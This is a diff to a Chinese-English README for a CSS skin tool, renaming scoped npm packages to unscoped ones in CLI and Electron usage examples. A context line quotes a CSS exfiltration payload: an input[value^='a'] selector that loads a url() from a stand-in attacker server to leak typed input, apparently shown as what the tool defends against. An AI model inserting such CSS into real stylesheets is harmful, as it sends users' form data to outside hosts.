@@ -154,9 +154,9 @@ input[value^="a"] { background: url(https://坏人的服务器/?a); }
 ### 自己做一套皮肤
 
 ```bash
-npx @css-guard/cli new my-skin      # 生成骨架
-npx @css-guard/cli validate skins   # 检查，有 error 退出码 1，可直接当 CI 闸门
-npx @css-guard/cli pack skins/my-skin   # 打成 zip 分享
+npx css-guard-cli new my-skin      # 生成骨架
+npx css-guard-cli validate skins   # 检查，有 error 退出码 1，可直接当 CI 闸门
+npx css-guard-cli pack skins/my-skin   # 打成 zip 分享
 ```
 
 格式一页写完：[docs/skin-format.md](docs/skin-format.md)
@@ -164,7 +164,7 @@ npx @css-guard/cli pack skins/my-skin   # 打成 zip 分享
 ### 让你自己的 Electron 应用能换皮肤
 
 ```js
-const { registerSkinScheme, createSkinHost } = require("@css-guard/electron");
+const { registerSkinScheme, createSkinHost } = require("css-guard-electron");
 
 registerSkinScheme();                                  // app ready 之前
 
@@ -270,7 +270,7 @@ Full contract: [docs/agent-recovery.md](docs/agent-recovery.md)
 ## For developers
 
 ```js
-const { registerSkinScheme, createSkinHost } = require("@css-guard/electron");
+const { registerSkinScheme, createSkinHost } = require("css-guard-electron");
 registerSkinScheme();                                  // before app.whenReady()
 const skins = createSkinHost({ roots: [skinsDir] });   // after
 skins.install();
